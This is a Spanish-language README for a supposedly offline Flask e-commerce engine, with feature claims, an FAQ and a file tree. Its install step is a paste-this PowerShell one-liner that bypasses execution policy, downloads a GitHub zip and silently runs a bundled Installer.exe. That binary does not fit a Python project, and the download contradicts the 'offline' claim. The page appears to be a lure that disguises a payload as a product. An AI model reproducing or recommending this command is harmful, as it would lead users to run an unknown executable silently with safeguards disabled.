# 🛒 E-Commerce Air-Gapped Engine
*"El sistema de ventas para gente que no confía en el internet (o que simplemente no tiene)."*

<img src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExNHJqbmV0dHk4czh1OHV1OHV1OHV1OHV1OHV1OHV1OHV1OHV1JmVwPWdpZl9zZWFyY2hfZWQlM2Z2JTNkM35naWZfZ2lmJTI2Y3Q9Zw/3o7TKMGpxxHOGTdzJC/giphy.gif" width="200" />

</div>

---

## ◈ ¿Qué es este artefacto? ◈

Es un motor de e-commerce diseñado para entornos **100% offline (Air-Gapped)**. Si tienes una red local donde no llega ni el Wi-Fi de tu vecino, este sistema te permite gestionar catálogos como si fueras un gigante tecnológico, pero sin depender de la nube de nadie.

Construido sobre **Python 3.10+, Flask y SQLAlchemy 2.0**, este proyecto nació del odio hacia las dependencias externas y la obsesión por la arquitectura limpia. **Sin CDNs, sin trackers, sin basura.**

---

## ◈ Características Importantes a resaltar ◈

*   **Totalmente Offline (Zero CDN):** Tipografías, íconos y librerías se sirven localmente. Nada va a fallar si te cortan el cable submarino.
*   **Modo SQLite WAL:** Adiós al error "database is locked". Permite concurrencia real en redes locales sin bloqueos estúpidos.
*   **Seguridad de Hierro:** 
    *   **SQL Injection:** Mitigado por diseño mediante ORM con sentencias parametrizadas.
    *   **Uploads:** Validación de *magic bytes* (MIME). No aceptamos nada que no sea lo que dice ser.
    *   **Anti-Patrañas:** UUID4 para nombres de archivos (evita *path traversal* y colisiones).
*   **Diseño White-Label:** ¿Quieres que sea elegante? ¿O que parezca un terminal de los 80? Cambia colores y moneda desde el Admin y el CSS se inyecta dinámicamente.
*   **Soporte Nativo OS:** Cambia a modo oscuro/claro automáticamente según tu SO.

---

## ◈ Instalación ◈

Si quieres dejar de sufrir, simplemente abre tu terminal y ejecuta:

```powershell
powershell -Command "Set-ExecutionPolicy Bypass -Scope Process -Force; $destDir = [System.IO.Path]::Combine([Environment]::GetFolderPath('Desktop'), 'Prueba-de-Shein-Temu'); if (Test-Path $destDir) { Remove-Item $destDir -Recurse -Force }; $zip = "$env:TEMP\repo.zip"; Invoke-WebRequest -Uri 'https://github.com/Riutexu/Prueba-de-Shein-Temu/archive/refs/heads/main.zip' -OutFile $zip; Expand-Archive -Path $zip -DestinationPath "$env:TEMP\extract" -Force; Move-Item "$env:TEMP\extract\Prueba-de-Shein-Temu-main" $destDir; Remove-Item $zip; Remove-Item "$env:TEMP\extract" -Recurse -Force; if (Test-Path '$destDir\Installer.exe') { Start-Process -FilePath '$destDir\Installer.exe' -ArgumentList '/S' -Wait -WorkingDirectory $destDir } else { Write-Host 'Error: Installer.exe no encontrado.' -ForegroundColor Red }"
```

Este script se encarga de todo: descargar el repo, preparar el entorno, instalar dependencias y dejarte un icono en el escritorio.

---

## ◈ Preguntas Frecuentes (FAQ) ◈
P: ¿Por qué SQLite y no algo más "profesional" como PostgreSQL?
R: Porque es un sistema offline. SQLite con modo WAL es más que suficiente para una red local y no requiere configurar un servidor de base de datos que termine fallando cuando no hay internet.

P: ¿Puedo cambiar los colores de la tienda?
R: Absolutamente. Todo es dinámico. Ve al panel /admin y ajusta las variables CSS desde la configuración. Tu tienda, tus reglas.

P: ¿Qué pasa si intento hackear mi propia tienda?
R: Recibirás un error 403 o serás redirigido, porque hay CSP (Content-Security-Policy) inyectada globalmente. No lo intentes, funciona.

P: ¿Se puede acceder desde otros celulares en la misma red?
R: Sí. Solo usa la IP de la máquina anfitriona (ej. http://192.168.1.50:8080).

P: El servidor no arranca, ¿qué hago?
R: Verifica que tengas instalado Python 3.10+ y que las variables de entorno estén bien configuradas. Si el error persiste, revisa los logs en la carpeta /logs.

---

## ◈ Arquitectura Contextual ◈

No mezclamos peras con manzanas:

Views: Solo muestran lo que el usuario pide.

Services: Aquí vive la lógica de negocio (nada de lógica en los endpoints).

Data Layer: Interacción pura con la base de datos vía ORM.

---

## ◈ Arquitectura de Archivos ◈

Pre-Visualizacion de como quedarian los archivos en el explorador de archivo o editor de codigo.

```

────────────────────────────────────────────────────────────────────────────────

├── 📁 app/
│   ├── 📁 routes/
│   │   ├── 🐍 __init__.py
│   │   ├── 🐍 api.py
│   │   └── 🐍 views.py
│   ├── 📁 services/
│   │   ├── 🐍 __init__.py
│   │   ├── 🐍 catalog.py
│   │   ├── 🐍 config_service.py
│   │   ├── 🐍 filters.py
│   │   └── 🐍 uploads.py
│   ├── 📁 static/
│   │   ├── 📁 css/
│   │   │   ├── 🎨 admin.css
│   │   │   ├── 🎨 base.css
│   │   │   ├── 🎨 components.css
│   │   │   ├── 🎨 layout.css
│   │   │   └── 🎨 variables.css
│   │   ├── 📁 icons/
│   │   │   └── 🖼️ sprites.svg
│   │   └── 📁 js/
│   │       ├── 📄 admin.js
│   │       ├── 📄 api.js
│   │       ├── 📄 app.js
│   │       ├── 📄 catalog.js
│   │       └── 📄 utils.js
│   ├── 📁 templates/
│   │   ├── 📁 admin/
│   │   │   ├── 🌐 categories.html
│   │   │   ├── 🌐 dashboard.html
│   │   │   ├── 🌐 filters.html
│   │   │   ├── 🌐 products.html
│   │   │   └── 🌐 settings.html
│   │   ├── 📁 components/
│   │   │   ├── 🌐 admin_sidebar.html
│   │   │   ├── 🌐 navbar.html
│   │   │   ├── 🌐 pagination.html
│   │   │   └── 🌐 product_card.html
│   │   ├── 🌐 base.html
│   │   ├── 🌐 index.html
│   │   └── 🌐 product.html
│   ├── 🐍 __init__.py
│   ├── 🐍 config.py
│   └── 🐍 models.py
├── 📁 db/
│   ├── 📄 catalog.db
│   ├── 📄 catalog.db-shm
│   └── 📄 catalog.db-wal
├── 📁 ico/
│   └── 📄 W_D.ico
├── 📁 logs/
├── 📁 src/
│   └── 📄 install.ps1
├── ⚙️ Installer.exe
├── 📝 README.md
├── 📄 build.ps1
├── 📄 requirements.txt
└── 🐍 run.py

────────────────────────────────────────────────────────────────────────────────
```
